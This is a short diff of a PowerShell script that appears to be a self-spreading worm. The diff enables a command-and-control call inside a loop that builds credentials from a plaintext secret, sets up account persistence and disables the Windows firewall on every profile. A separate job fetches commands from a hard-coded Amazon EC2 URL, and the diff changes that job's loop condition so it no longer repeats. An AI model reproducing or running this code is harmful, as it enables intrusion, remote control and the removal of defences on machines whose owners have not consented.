@@ -93,7 +93,7 @@ function wormy{
     while(1 -eq 1){
         [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
-        #cNc
+        cNc
         accountPersist
         
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
@@ -162,7 +162,7 @@ start-job -ScriptBlock{
 }
 
 start-job -scriptBlock {
-    while(1 -eq 1){
+    while(1 -eq 2){
         $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
         $httpCommand=invoke-restmethod $cNcURL
         $httpCommand | out-file -filepath .\rf.txt
